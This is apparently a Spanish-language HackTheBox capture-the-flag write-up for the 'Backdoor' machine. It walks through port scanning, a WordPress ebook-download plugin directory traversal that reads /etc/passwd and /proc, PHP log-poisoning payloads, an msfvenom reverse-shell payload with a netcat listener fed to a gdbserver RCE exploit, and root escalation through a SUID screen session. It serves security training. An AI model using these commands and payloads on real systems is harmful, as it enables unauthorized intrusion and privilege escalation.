---
title: "HackTheBox: Backdoor"
date: 2022-10-25T18:14:31-04:00
categories:
  - HackTheBox
tags:
  - Wordpress
  - Directory Traversal
  - SUID
---

Maquina de dificultad fácil que conlleva directory traversal por medio un plugin en wordpress, lo que permite leer archivos del sistema y nos permitira ver el servicio que corre en el puerto 1337, a través de una vulnerabilidad que tiene, obtener una shell, para luego por medio del comando screen que tiene permisos SUID obtener una session como root.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/Backdoor.png)

## Scanning

Primero se realizara el escaneo para ver que puertos estan abiertos
> - `-sS`: SYN port scan
> - `--open`: Reportar solo los puertos abiertos
> - `-p-`: Escanear los 65535 puertos
> - `-v`: Modo verbose
> - `-n`: No hacer resolucion DNS
> - `-Pn`: No hacer host discovery
> - `-oG open_ports`: Guardar la captura formato grepeable para uso con `grep`

```bash
nmap -sS --open -p- -n -Pn -v 10.10.11.125 -oG open_ports

host: 10.10.11.125() Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 1337/open/tcp//waste///
```

Con esta captura y usando el comando `grep` se puede filtrar por los puertos abiertos que nos informa nmap
```bash
grep -oP '\d{1,5}/open' open_ports | grep -oE "[0-9]+" | xargs | tr ' ' ','
22,80,1337
```

Ahora se puede realizar otro escaneo para detectar las versiones `-sV`, y probar los scripts de numeración mas comunes `-sC` de los puertos que se encontraron abiertos `-p{ports}`
```
nmap -sC -sV -p22,80,1337 10.10.11.125 -oN target
```

| Puerto | Servicio | Versión                         |
| ------ | -------- | ------------------------------- |
| 22     | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80     | http     | Apache httpd 2.4.41             |
| 1337   | waste?   | ---                        | 


Al inspeccionar la pagina web los links redireccionan a `http://backdoor.htb/...` por lo que se puede suponer que esta realizando virtual hosting, por este motivo se puede agregar la siguiente linea al `/etc/hosts`
```bash
$ vim /etc/hosts
...
10.10.11.125    backdoor.htb
```

## Enumeración y acceso

Al revisar que tecnologias esta usando este sitio, por medio del **wappalyzer**, se puede notar que usa Wordpress
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/backdoor_wappalyzer.png)

En este punto, se puede intentar acceder a las rutas `/wp-login.php` o `/wp-admin`, pero ya que no contamos con credenciales, no tendria caso, pero ya que Wordpress usa plugins podemos ir a `/wp-content/plugins` y ver si se encuentra algun plugin con vulnerabilidades

En este caso se indexan los directorios, pero en caso de que no llege a suceder esto, se puede hacer un fuzzing para descubrir plugins existentes
{: .notice}
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/backdoor_wp_plugins.png)

Como se puede observar, se tiene un plugin llamado `ebook-download` entonces investigando, tiene una vulnerabilidad de [Directory Traversal][ebook-plugin]

Por lo que al ir a `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={file_system_name}` se estaria realizando un director traversal con el que podriamos para leer archivos del sistema
```bash
curl -s 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd'
root:x:0:0root:/root:/bin/bash
<snip>
```

> Con esta vulnerabilidad se podria consegir ejecución de comandos en la maquina sí:
> - La maquina tuviera una una llave privada `id_rsa` del usario `user` y al autenticarnos con esta llave no seria necesario proporcionar credenciales del usuario
> - O si tuvieramos acceso a los logs de apache en `/var/log/apache2/access.log`, `/var/log/httpd/access.log` o los logs de ssh en `/var/log/auth.log`
> 	- En apache podriamos enviar un payload en los headers para que con php nos ejecute algún commando del sistema `-H 'User-Agent: <?php echo system("whoami"); ?>'`
> 	- O en ssh podriamos intentar entrar por ssh con un usuario y que nos interprete esto como una sentencia php para que tambien podamos ejecutar comamdos: `ssh '<?php echo system("whoami"); ?>'@10.10.11.125`

Pero, ya que no hay la posibilidad de hacer de hacer un log poisoning o autenticarnos con la llave privada del usuario, se puede buscar información importante en la maquina, por ejemplo en el directorio `/proc/` como en el `/proc/self/environ` para ver las variables de entorno, etc.

En este punto podemos intentar ver que comando esta ejecutando cada proceso desde `/proc/{PID}/cmdline`
```bash
curl -s "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/1/cmdline" --output 1
```
**Nota:** Ya que estos son archivos son binarios, entonces hay que usar la opción `--output` para guardar los datos binarios directamente a un archivo
{: .notice}

Lo que se puede hacer, es un for loop para ir iterando cada proceso
```bash
for i in {1..1000}; do curl -s "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline" --output $i; done
```

Una vez haya terminado, se puede investigar que tipo de archivo es mediante el comando `file`, ya que si es un archivo `html` no nos serviria, pero si es un archivo `data` significaria que tiene información binaria de la maquina.
```bash
file * | grep -v HTML | cut -d: -f1 | while read pid; do cat $pid; echo; done | sed 's/.*cmdline//' | sed 's/<script.*//'
```
> - `file * | grep -v HTML`: para ver que tipo de archivo es y quitar todos los que son formato HTML
> 	- output example: `971: data`
> - `cut -d: -f1`: para dividir el output usando como delimitador `:` y tomar el primer argumento
> 	- output example: `971`
> - `while read pid; do cat $pid; echo; done`: usuando la salida anterior que son los ficheros que contienen data le hacemos un `cat` para leer cada uno de estos y hacer un salto de linea
> 	- output example: `/proc/971/cmdline/proc/971/cmdline/proc/971/cmdline/usr/sbin/mysql<script>window.close()</script>`
> - `sed 's/.*cmdline//' | sed 's/<script.*//'`: y al final con el output de los archivos quitarle lo que no forma parte del comando que se esta ejecutando
> 	- output example: `/usr/sbin/mysql`

En una parte de todo esto se puede observar que hay un servicio ejecutandose en el puerto 1337:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/backdoor_processes.png)

Y en el escaneo de nmap vimos que tenemos el puerto 1337 abierto, por lo que investigando, se encontro un exploit que da la posibilidad de ejecutar un [RCE][backdoor-rce]

Ejecutando este exploit pide lo siguiente:
1. Generar una shellcode con msfvenom
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=4433 PrependFork=true -o rev.bin`
2. Ponernos en escucha en nuestra maquina de atacante
`nc -nlvp 4433`
3. Y correr el exploit
`python3 gdbserver_exploit.py 10.10.11.125:1337 rev.bin`

Nos corremos el exploit y nos regresa una shell, aunque no es una shell interactiva podemos hacerle un upgrade para que sea totalmente interactiva:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/backdoor_interactive_tty.png)

## Escalación de privilegios

Buscando por archivos SUID se puede ver que hay un binario SUID no muy comun: `screen`
```bash
find / -perm -4000 2> /dev/null
<snip>
...
/usr/bin/screen
...
<snip>
```

Y recordando que hay un proceso de `screen` ejecutandose, que de igual manera se puede verificar mediante el comando `ps -ef | grep screen` para ver que es lo que hace
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/backdoor_ps_screen.png)

En este output se puede ver que el usuario root tiene una sesión corriendo, y ya que tenemos el permiso SUID del comando `screen` lo que se puede intentar hacer es, conectarnos a esta sesión y obtener una session como el usuario root.
```bash
screen -r root/
```
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/backdoor_root.png)

Y nos manda la session como el usuario root, por lo que ya podriamos leer la flag de root y seria todo!

[backdoor-rce]:https://www.exploit-db.com/exploits/50539
[ebook-plugin]:https://www.exploit-db.com/exploits/39575
